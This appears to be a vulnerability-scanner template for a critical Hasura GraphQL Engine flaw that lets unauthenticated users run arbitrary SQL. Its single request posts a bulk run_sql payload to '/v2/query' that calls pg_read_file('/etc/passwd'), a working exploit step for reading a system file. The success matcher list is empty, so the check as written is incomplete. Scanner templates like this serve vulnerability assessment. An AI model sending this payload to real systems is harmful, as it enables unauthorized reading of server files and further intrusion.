id: hasura-graphql-psql-exec
brief:
    title: Hasura GraphQL Engine - Remote Code Execution
    by: Udyz
    level: critical
    about: Hasura GraphQL Engine allows remote unauthenticated users to execute arbitrary SQL statements via the '/v2/query' endpoint (aka remote code execution).
    label:
        - graphql
        - edb
        - hasura
        - rce
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/v2/query'
      head:
        Content-Type: application/json
      body: |-
        {
          "type": "bulk",
          "source": "default",
          "args":[
            {
              "type": "run_sql",
              "args": {
                "source":"default",
                "sql":"SELECT pg_read_file('/etc/passwd',0,100000);",
                "cascade": false,
                "read_only": false
              }
            }
          ]
        }
      signs: []
